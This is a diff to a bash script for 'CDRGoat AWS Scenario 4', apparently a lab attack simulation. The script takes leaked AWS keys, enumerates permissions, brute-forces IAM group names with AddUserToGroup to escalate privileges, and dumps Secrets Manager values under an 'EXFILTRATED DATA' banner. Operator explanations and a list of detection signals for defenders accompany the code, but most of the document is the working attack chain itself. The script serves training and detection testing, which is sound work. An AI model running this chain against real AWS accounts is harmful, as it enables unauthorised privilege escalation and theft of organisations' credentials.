@@ -42,89 +42,6 @@ spin_start() {
 }
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
-banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 4               ===" "${RESET}"
-  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
-  printf "  • Step 1. Configuring aws credentials\n"
-  printf "  • Step 2. Permission enumeration for leaked credentials\n"
-  printf "  • Step 3. IAM Introspection & Escalation Discovery\n"
-  printf "  • Step 4. Group brute-force + privilege escalation attempt\n"
-  printf "  • Step 5. Dumping secrets from Secrets Manager\n"
-
-}
-banner
-
-#############################################
-# Preflight checks (no changes to your logic)
-#############################################
-step "Preflight checks"
-missing=0
-for c in aws curl jq zip; do
-  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
-done
-[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
-
-read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
-#############################################
-# Step 1. Configuring aws credentials
-#############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
-is_valid_keys() {
-  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
-  local rc=0 out
-
-  # 1) Ensure no env creds override our profile
-  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
-  PROFILE="streamgoat-scenario-4"
-
-  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
-  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
-  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
-  aws configure set region                "$region" --profile "$PROFILE"
-
-  # 3) Force the call to use our profile
-  spin_start "Validating credentials via STS"
-  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
-  spin_stop
-
-  if [ "$rc" -ne 0 ]; then
-    return 1
-  fi
-
-  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"
-
-  return 0
-}
-
-step "Starting point configuration"
-while :; do
-  read -r -p "Enter leaked AWS key: " AWSKEY_USER
-  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
-  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
-    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
-    break
-  else
-    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
-  fi
-done
-printf "\n"
-read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
-#############################################
-# Operator explanation
-#############################################
-printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
-printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
-printf "This simulates credentials from a helpdesk or support user.\n"
-printf "These accounts often have overlooked escalation paths.\n\n"
-
-#############################################
-# Step 2. Permission enumeration for leaked credentials
-#############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
-
-# init colors (portable)
-
 try() {
   local desc="$1"; shift
   local rc
@@ -139,11 +56,99 @@ try() {
   fi
 }
 
-# Identity/context
-try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
-try "IAM List Roles"  aws iam list-roles --profile "$PROFILE"
+is_valid_keys() {
+  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
+  local rc=0 out
 
-# Inventory
+  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
+  PROFILE="streamgoat-scenario-4"
+
+  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
+  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
+  aws configure set region                "$region" --profile "$PROFILE"
+
+  spin_start "Validating credentials via STS"
+  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
+  spin_stop
+
+  if [ "$rc" -ne 0 ]; then
+    return 1
+  fi
+
+  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"
+  return 0
+}
+
+banner() {
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 4               ===" "${RESET}"
+  printf "%sLeaked Helpdesk Key → IAM Group Brute-force → Secret Exfiltration%s\n\n" "${GREEN}" "${RESET}"
+  printf "This automated attack script will:\n"
+  printf "  • Step 1. Configure leaked AWS credentials\n"
+  printf "  • Step 2. Enumerate permissions for leaked credentials\n"
+  printf "  • Step 3. IAM introspection and escalation discovery\n"
+  printf "  • Step 4. Group name brute-force and privilege escalation\n"
+  printf "  • Step 5. Dump secrets from Secrets Manager\n"
+}
+banner
+
+#############################################
+# Preflight checks
+#############################################
+step "Preflight checks"
+missing=0
+for c in aws jq; do
+  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
+done
+[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
+
+read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Step 1. Configuring AWS credentials
+#############################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials  ===" "${RESET}"
+
+step "Starting point configuration"
+while :; do
+  read -r -p "Enter leaked AWS key: " AWSKEY_USER
+  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
+  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
+    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
+    break
+  else
+    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
+  fi
+done
+printf "\n"
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
+printf "This simulates credentials from a helpdesk or support user.\n"
+printf "These accounts often have overlooked escalation paths.\n\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Step 2. Permission enumeration for leaked credentials
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
+
+step "Identifying stolen identity"
+spin_start "Calling STS GetCallerIdentity"
+CALLER_ID="$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null)"
+spin_stop
+
+if [ -n "$CALLER_ID" ]; then
+  ok "Identity confirmed"
+  printf "  • Account : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Account')" "$RESET"
+  printf "  • ARN     : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Arn')" "$RESET"
+  printf "  • UserId  : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.UserId')" "$RESET"
+fi
+
+step "Probing permissions across AWS services"
+try "IAM List Roles"        aws iam list-roles --profile "$PROFILE"
 try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
 try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
 try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
@@ -157,29 +162,26 @@ try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --pro
 try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
-printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
+printf "\nPermissions are quite limited. Let's investigate our own IAM identity further...\n"
 printf "\n"
-read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
-printf "Most services returned [DENY] - this appears to be a restricted account.\n\n"
+printf "Most services returned [DENY] — this appears to be a restricted account.\n\n"
 printf "When direct service access is limited, attackers focus on:\n"
 printf "  • What IAM permissions does this user have?\n"
 printf "  • What groups are they in?\n"
 printf "  • Are there escalation paths through IAM itself?\n\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 3. IAM Introspection & Escalation Discovery
 #############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. IAM Introspection & Escalation Discovery  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. IAM introspection and escalation discovery  ===" "${RESET}"
 
-PROFILE="streamgoat-scenario-4"
-
-# Step 3.1 Who Am I
-step "Resolving current identity..."
+step "Resolving current identity"
 IDENTITY=$(aws sts get-caller-identity --profile "$PROFILE" --output json)
 
 USER_ARN=$(echo "$IDENTITY" | jq -r '.Arn')
@@ -192,7 +194,6 @@ info "  ARN       : $USER_ARN"
 info "  Account   : $ACCOUNT_ID"
 info "  UserId    : $USER_ID"
 
-# Step 3.2 List groups for user (we *do* have this permission)
 step "Getting group memberships for user: ${YELLOW}${USER_NAME}${RESET}"
 USER_GROUPS=$(aws iam list-groups-for-user --user-name "$USER_NAME" --profile "$PROFILE" | jq -r '.Groups[].GroupName')
 
@@ -203,11 +204,9 @@ else
   echo "$USER_GROUPS" | sed 's/^/  - /'
 fi
 
-# Step 3.3 Enumerate policies for each group
 for group in $USER_GROUPS; do
   step "Inspecting policies for group: ${CYAN}${group}${RESET}"
 
-  # Inline policies
   INLINE_POLICIES=$(aws iam list-group-policies --group-name "$group" --profile "$PROFILE" | jq -r '.PolicyNames[]?')
   if [ -n "$INLINE_POLICIES" ]; then
     ok "Inline policies found:"
@@ -219,7 +218,6 @@ for group in $USER_GROUPS; do
     info "No inline policies found on $group"
   fi
 
-  # Attached managed policies
   MANAGED=$(aws iam list-attached-group-policies --group-name "$group" --profile "$PROFILE" | jq -r '.AttachedPolicies[].PolicyArn')
 
   if [ -n "$MANAGED" ]; then
@@ -234,6 +232,9 @@ for group in $USER_GROUPS; do
   fi
 done
 
+step "Trying to enumerate all IAM groups"
+try "IAM ListGroups" aws iam list-groups --profile "$PROFILE" --output json
+
 #############################################
 # Operator explanation
 #############################################
@@ -241,48 +242,36 @@ printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "We discovered the user has ${MAGENTA}iam:AddUserToGroup${RESET} permission.\n\n"
 printf "This allows self-promotion: if there's a more privileged group,\n"
 printf "we can add ourselves to it and inherit those permissions.\n\n"
-printf "Constraint: Can only add to groups matching StreamGoat-Group* prefix.\n\n"
-
-printf "\nWhat we can do with this information? The interesting permissions here is ${YELLOW}iam:AddUserToGroup${RESET}. We can add ourself to any other group which start with prefix ${YELLOW}StreamGoat-Group${RESET}\n"
-read -r -p "But we need to know group name. Lets try get the list of groups. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-# Step 3.4 Attempt to list all group names (expected to fail)
-
-step "Trying to enumerate all IAM groups (should fail unless overly permissive)"
-try "IAM ListGroups" aws iam list-groups --profile "$PROFILE" --output json
-
-printf "\nWell, this means we can not know if there is any other groups. But we may quess and try to bruteforce performing AddUserToGroup operation. If we receive an error - group doesn't exist. But if no error we have some luck.\n"
-printf "\n"
-read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
-#############################################
-# Operator explanation
-#############################################
-printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
-printf "Without iam:ListGroups, we cannot enumerate available groups.\n\n"
+printf "Without iam:ListGroups, we cannot enumerate available groups.\n"
 printf "However, we can brute-force by trying AddUserToGroup:\n"
 printf "  • \"NoSuchEntity\" → Group doesn't exist\n"
 printf "  • Success → Group exists AND we're now a member!\n\n"
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
-# Step 4. Group brute-force + privilege escalation attempt
+# Step 4. Group brute-force + privilege escalation
 #############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Group Name Brute-force & Self-Add  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Group name brute-force and privilege escalation  ===" "${RESET}"
 
-# List of guessed groups (only one is real)
+# Extract suffix from known helpdesk group
+KNOWN_GROUP=$(echo "$USER_GROUPS" | grep "helpdesk" | head -1)
+GROUP_SUFFIX=$(echo "$KNOWN_GROUP" | sed 's/.*helpdesk-//')
+GROUP_PREFIX="StreamGoat-aws4-Group"
+
 GROUP_GUESSES=(
-  "StreamGoat-Group-finance"
-  "StreamGoat-Group-devops"
-  "StreamGoat-Group-admin"
-  "StreamGoat-Group-secretreaders"  # <-- This is the real one
-  "StreamGoat-Group-hr"
-  "StreamGoat-Group-data"
-  "StreamGoat-Group-auditors"
-  "StreamGoat-Group-infra"
-  "StreamGoat-Group-support"
-  "StreamGoat-Group-analytics"
+  "${GROUP_PREFIX}-finance-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-devops-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-admin-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-secretreaders-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-hr-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-data-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-auditors-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-infra-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-support-${GROUP_SUFFIX}"
+  "${GROUP_PREFIX}-analytics-${GROUP_SUFFIX}"
 )
 
-step "Attempting to add current user (${YELLOW}${USER_NAME}${RESET}) to guessed groups"
+step "Attempting to add ${YELLOW}${USER_NAME}${RESET} to guessed groups"
 
 for group in "${GROUP_GUESSES[@]}"; do
   try "AddUserToGroup: $group" \
@@ -292,8 +281,7 @@ for group in "${GROUP_GUESSES[@]}"; do
       --profile "$PROFILE"
 done
 
-# Step 4b: Check current group memberships (again)
-step "Re-checking group memberships for user: ${YELLOW}${USER_NAME}${RESET} (after brute-force)"
+step "Re-checking group memberships after brute-force"
 
 USER_GROUPS_JSON=$(aws iam list-groups-for-user --user-name "$USER_NAME" --profile "$PROFILE")
 USER_GROUP_LIST=($(echo "$USER_GROUPS_JSON" | jq -r '.Groups[].GroupName'))
@@ -307,23 +295,23 @@ else
   done
 fi
 
-#############################################
-# Operator explanation
-#############################################
-printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
-printf "Group name brute-force succeeded!\n\n"
-printf "We joined ${MAGENTA}StreamGoat-Group-secretreaders${RESET}.\n"
-printf "This is privilege escalation through IAM - we gained new\n"
-printf "permissions without exploiting any service vulnerability.\n\n"
+# Derive TARGET_GROUP dynamically from newly joined groups
+TARGET_GROUP=""
+for g in "${USER_GROUP_LIST[@]}"; do
+  if echo "$g" | grep -q "secretreaders"; then
+    TARGET_GROUP="$g"
+    break
+  fi
+done
 
-printf "\nPerfect! We just added ourself to the group ${YELLOW}StreamGoat-Group-secretreaders${RESET}.\n"
-read -r -p "Lets check which permissions this group gives us. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+if [ -z "$TARGET_GROUP" ]; then
+  err "Could not find secretreaders group after brute-force"
+  exit 1
+fi
 
-# Step 4c: Inspect newly joined privileged group
-TARGET_GROUP="StreamGoat-Group-secretreaders"
+printf "\nSuccessfully joined ${YELLOW}${TARGET_GROUP}${RESET}.\n"
 step "Inspecting policies for newly joined group: ${YELLOW}${TARGET_GROUP}${RESET}"
 
-# Inline policies
 INLINE_POLICIES=$(aws iam list-group-policies --group-name "$TARGET_GROUP" --profile "$PROFILE" | jq -r '.PolicyNames[]?')
 
 if [ -n "$INLINE_POLICIES" ]; then
@@ -336,7 +324,6 @@ else
   info "No inline policies found on $TARGET_GROUP"
 fi
 
-# Attached managed policies
 MANAGED_POLICIES=$(aws iam list-attached-group-policies --group-name "$TARGET_GROUP" --profile "$PROFILE" | jq -r '.AttachedPolicies[].PolicyArn')
 
 if [ -n "$MANAGED_POLICIES" ]; then
@@ -351,43 +338,44 @@ else
 fi
 
 printf "\n"
-read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
-printf "The group grants Secrets Manager access:\n"
+printf "Group name brute-force succeeded!\n\n"
+printf "We joined ${MAGENTA}${TARGET_GROUP}${RESET} which grants:\n"
 printf "  • ${MAGENTA}secretsmanager:ListSecrets${RESET}\n"
 printf "  • ${MAGENTA}secretsmanager:GetSecretValue${RESET}\n\n"
-printf "We can now access secrets containing database credentials,\n"
-printf "API keys, and other sensitive data.\n\n"
+printf "This is privilege escalation through IAM — we gained new\n"
+printf "permissions without exploiting any service vulnerability.\n\n"
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 5. Dumping secrets from Secrets Manager
 #############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. SecretsManager Dump (StreamGoat-*)  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Dumping secrets from Secrets Manager  ===" "${RESET}"
 
 step "Enumerating secrets"
 
 SECRET_NAMES=($(aws secretsmanager list-secrets \
   --profile "$PROFILE" \
-  --query "SecretList[?starts_with(Name, 'StreamGoat-')].Name" \
+  --query "SecretList[?starts_with(Name, 'StreamGoat-aws4-')].Name" \
   --output text))
 
 if [ "${#SECRET_NAMES[@]}" -eq 0 ]; then
-  err "No secrets found with prefix 'StreamGoat-'"
+  err "No secrets found with prefix 'StreamGoat-aws4-'"
 else
-  ok "Found ${#SECRET_NAMES[@]} secrets:"
+  ok "Found ${#SECRET_NAMES[@]} secret(s):"
   for secret in "${SECRET_NAMES[@]}"; do
     echo "  - $secret"
   done
 fi
 
-step "Dumping secret values..."
+step "Dumping secret values"
 
 for secret in "${SECRET_NAMES[@]}"; do
-  echo -e "\n${BOLD}${YELLOW}[+] Dumping: $secret${RESET}"
+  printf "\n%s%s[+] Dumping: %s%s\n" "${BOLD}" "${YELLOW}" "$secret" "${RESET}"
   VALUE=$(aws secretsmanager get-secret-value \
     --secret-id "$secret" \
     --profile "$PROFILE" \
@@ -395,12 +383,31 @@ for secret in "${SECRET_NAMES[@]}"; do
     --output text 2>/dev/null)
 
   if [ -n "$VALUE" ]; then
+    printf "\n%s%s%s\n" "${BOLD}${RED}" "EXFILTRATED DATA" "${RESET}"
+    printf "%s\n" "---------------------------------------------------------------------"
     echo "$VALUE" | jq . || echo "$VALUE"
+    printf "%s\n" "---------------------------------------------------------------------"
     ok "Dumped: $secret"
   else
     err "Failed to dump: $secret"
   fi
 done
+
+#############################################
+# Cleanup — remove user from brute-forced group
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Cleanup — remove user from brute-forced group  ===" "${RESET}"
+printf "Removing user from ${YELLOW}${TARGET_GROUP}${RESET} so Terraform can destroy cleanly\n\n"
+
+if aws iam remove-user-from-group \
+  --group-name "$TARGET_GROUP" \
+  --user-name "$USER_NAME" \
+  --profile "$PROFILE" 2>/dev/null; then
+  ok "Removed $USER_NAME from $TARGET_GROUP"
+else
+  err "Failed to remove user from group (manual cleanup may be needed before terraform destroy)"
+fi
+
 ################################################################################
 # Final Summary
 ################################################################################
@@ -409,21 +416,20 @@ printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${R
 printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
 printf "  1. Validated leaked helpdesk user credentials\n"
 printf "  2. Enumerated permissions (limited service access)\n"
-printf "  3. Discovered iam:AddUserToGroup permission\n"
+printf "  3. Discovered iam:AddUserToGroup permission via IAM introspection\n"
 printf "  4. Brute-forced group names via AddUserToGroup\n"
-printf "  5. Joined StreamGoat-Group-secretreaders\n"
+printf "  5. Joined %s\n" "$TARGET_GROUP"
 printf "  6. Exfiltrated secrets from Secrets Manager\n\n"
 
 printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
-printf "  • Access to organization's secrets\n"
-printf "  • IAM privilege escalation via group membership\n"
-printf "  • Potential credential theft from Secrets Manager\n\n"
+printf "  • Access to organization's secrets (database credentials)\n"
+printf "  • IAM privilege escalation via group membership brute-force\n"
+printf "  • Potential lateral movement using exfiltrated credentials\n\n"
 
 printf "%s\n" "Defenders should monitor for:"
 printf "  • AddUserToGroup events, especially self-additions\n"
-printf "  • Secrets Manager GetSecretValue calls\n"
-printf "  • Group membership changes in CloudTrail\n"
-printf "  • Unusual IAM introspection patterns\n\n"
+printf "  • Repeated AddUserToGroup failures (brute-force indicator)\n"
+printf "  • Secrets Manager GetSecretValue calls from unexpected identities\n"
+printf "  • Group membership changes in CloudTrail\n\n"
 
-printf "\n"
 read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
